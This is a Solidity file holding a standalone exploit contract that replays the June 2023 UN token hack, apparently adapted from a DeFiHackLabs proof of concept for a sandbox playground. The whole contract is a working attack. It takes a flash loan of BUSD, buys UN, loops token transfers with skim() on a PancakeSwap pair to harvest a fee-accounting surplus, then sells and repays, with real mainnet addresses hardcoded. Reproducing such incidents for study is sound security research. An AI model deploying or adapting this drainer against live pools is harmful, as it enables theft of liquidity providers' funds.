// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-UN).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), and the DODO flash-loan callback `DPPFlashLoanCall`
// lives on the test itself) — there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack (testExploit's
// body -> run(); DPPFlashLoanCall unchanged) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/UN_exp.sol (DeFiHackLabs 2023-06-UN).
//
// Root cause: UN is a fee-on-transfer token whose _transfer charges its buy-side
// fee against the PAIR's own balance (from == swapPair branch) after the pair has
// already snapshotted reserve0 = balance0 for the full swapped amount. This leaves
// the pair's real UN balance below its recorded reserve0's counterpart obligations,
// and every subsequent UN.transfer(pair, x) + skim(self) round harvests the
// resulting balance-vs-reserve surplus for free (PancakeSwap's permissionless
// skim() pays out balance - reserve to anyone).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract UNDrain {
    IDPPOracle constant DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);

    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant UN = IERC20(0x1aFA48B74bA7aC0C3C5A2c8B7E24eB71D440846F);
    IUniswapV2Pair constant Pair = IUniswapV2Pair(0x5F739a4AdE4341D4AEe049E679095BcCbe904Ee1);

    // step 0: 0-cost DODO flash loan of 29,100 BUSD to fund the opening buy.
    function run() external {
        DPPOracle.flashLoan(0, 29_100 * 1e18, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // Step 1: buy UN out of the pair with the borrowed BUSD.
        (uint256 UNReserve, uint256 USDReserve,) = Pair.getReserves();
        uint256 amountIn = BUSD.balanceOf(address(this));
        uint256 amountOut = (9970 * amountIn * UNReserve) / (10_000 * USDReserve + 9970 * amountIn);
        BUSD.transfer(address(Pair), amountIn);
        Pair.swap(amountOut, 0, address(this), new bytes(0));

        // Steps 2-4: transfer UN back into the pair + skim() the surplus, 3 rounds.
        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 93 / 100);
        Pair.skim(address(this));
        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 90 / 100);
        Pair.skim(address(this));
        UN.transfer(address(Pair), UN.balanceOf(address(this)) * 80 / 100);
        Pair.skim(address(this));

        // Step 5: sell the accumulated (cheaply-harvested) UN back for BUSD.
        (UNReserve, USDReserve,) = Pair.getReserves();
        amountIn = UN.balanceOf(address(this));
        amountOut = (9970 * amountIn * USDReserve) / (10_000 * UNReserve + 9970 * amountIn);
        UN.transfer(address(Pair), amountIn);
        Pair.swap(0, amountOut, address(this), new bytes(0));

        // Step 6: repay the flash loan.
        BUSD.transfer(address(DPPOracle), 29_100 * 1e18);
    }
}
